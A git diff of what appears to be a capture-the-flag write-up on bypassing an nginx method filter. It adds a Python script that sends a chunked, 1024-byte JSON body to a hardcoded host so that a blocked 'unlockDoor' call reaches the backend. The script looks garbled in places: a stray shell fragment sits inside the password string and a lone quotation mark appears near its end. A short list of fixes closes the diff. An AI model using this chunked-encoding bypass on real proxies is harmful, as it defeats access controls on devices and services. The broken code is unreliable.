@@ -18,8 +18,7 @@ HubManager HM-7F3A21C4 · fw 2.4.1
 nginx/1.31.6 + Flask backend, one RPC endpoint: POST /api/v1/rpc
 ```
 
-
-# 1. Recon
+<img width="1156" height="696" alt="Screenshot 2026-10-01 231318" src="https://github.com/user-attachments/assets/02ccf27d-a433-4e56-b092-7c3b47c8e030" />
 
 After login you will see the hub manger:
 
@@ -135,7 +134,8 @@ Read it line by line, the bypass comes straight from here:
 
 1. `client_max_body_size 1024;` --> Decoded body > 1024 -> 413. Ours must be <=1024.
 2. `client_body_buffer_size 1024;` --> Bodies up to 1024 stay in RAM. Fragmented bodies spill to temp file on disk. Twice 1024 is screaming buffer-boundary — test exactly at 1024.
-3. `json_set $rpc_method $request_body "method";` --> Parse in-memory $request_body as JSON, copy method field. Key fact: $request_body is empty when body was written to temp file. No RAM body = nothing to parse = $rpc_method stays empty.
+3. `json_set $rpc_method $request_body "method";` --> Parse in-memory $request_body as JSON, copy method field.
+   Key fact: $request_body is empty when body was written to temp file. No RAM body = nothing to parse = $rpc_method stays empty.
 4. `map ... default 0;` --> unlockDoor -> 1 -> 403. Anything else including empty -> 0 -> allow. Fail-open. Missing is treated as safe.
 
 **What does this mean?**
@@ -175,7 +175,7 @@ Note: All methods I used to bypass from many resources and techniques inspired f
 
 # The Bypass — Same Body, Different Framing
 
-Insight: $request_body is empty when body spooled to temp file. Chunked bodies skip the allocate one buffer fast path, stream + spill, json_set sees nothing, but proxy still forwards file upstream.
+Insight: `$request_body` is empty when body spooled to temp file. Chunked bodies skip the allocate one buffer fast path, stream + spill, `json_set` sees nothing, but proxy still forwards file upstream.
 
 Decoded entity exactly 1024B (under client_max_body_size, not over):
 
@@ -202,8 +202,7 @@ open('/tmp/body.bin','wb').write(b''.join(b'1\r\n'+bytes([b])+b'\r\n' for b in b
 wc -c /tmp/body.bin # 6149
 ```
 
-Repeater setup:
-
+Then send as the body in burp like:
 ```http
 POST /api/v1/rpc HTTP/1.1
 Host: 95.217.6.37:30001
@@ -215,13 +214,27 @@ Connection: close
 
 **NO Content-Length — wrench icon -> UNCHECK Update Content-Length**
 
-Body = raw bytes of /tmp/body.bin, preserve \r\n, no extra newline.
-
-TODO: chunked request headers
-
-Screenshot 10 to insert here — images/10-chunked-request.png:
-
-Repeater request pane: headers show Transfer-Encoding: chunked, Connection: close, NO Content-Length, Cookie: session=.... Body starts with 1\r\n{\r\n1\r\n"\r\n... visible. If Burp wraps, show Hex view first bytes + total wire 6149. Purpose: proves framing, not JSON, is the exploit.
+One shot script to send our exploit:
+```python
+import socket,requests,time
+BASE='http://95.217.6.37:30001'
+s=requests.Session()
+u='ex%d'%(int(time.time()%100000))
+s.post(BASE+'/api/v1/rpc',json={'method':'register','username':u,'password':'P@ssw0rdxdg-open /tmp/render_result_final.png'})
+sess=s.cookies.get('session')
+body=b'{\"method\":\"unlockDoor\",\"device\":\"front_door\"}'+b' '*(1024-45)
+chunked=b''.join(b'1\r\n'+bytes([b])+b'\r\n' for b in body)+b'0\r\n\r\n'
+req=('POST /api/v1/rpc HTTP/1.1\r\nHost: 95.217.6.37:30001\r\nContent-Type: application/json\r\nCookie: session='+sess+'\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n').encode()+chunked
+sock=socket.create_connection(('95.217.6.37',30001),timeout=10)
+sock.sendall(req)
+resp=b''
+while True:
+ p=sock.recv(4096)
+ if not p: break
+ resp+=p
+print(resp.decode(errors='replace'))
+"
+```
 
 <img width="1130" height="602" alt="image" src="https://github.com/user-attachments/assets/5e5edf1e-7e9b-4894-b2cb-dc08835bd29f" />
 
@@ -245,4 +258,5 @@ Fix that kills class:
 3. Test whole path: CL vs chunked, many-small-chunks, 1023/1024/1025, dup keys, deep JSON, bad unicode.
 4. Alert when JSON POST proxied without extracted method.
 
-Wire math: `1024 chunks * 6 + 5 = 6149`.
+# Reference
+See the last version of Nginx update [here](https://nginx.org/en/CHANGES).
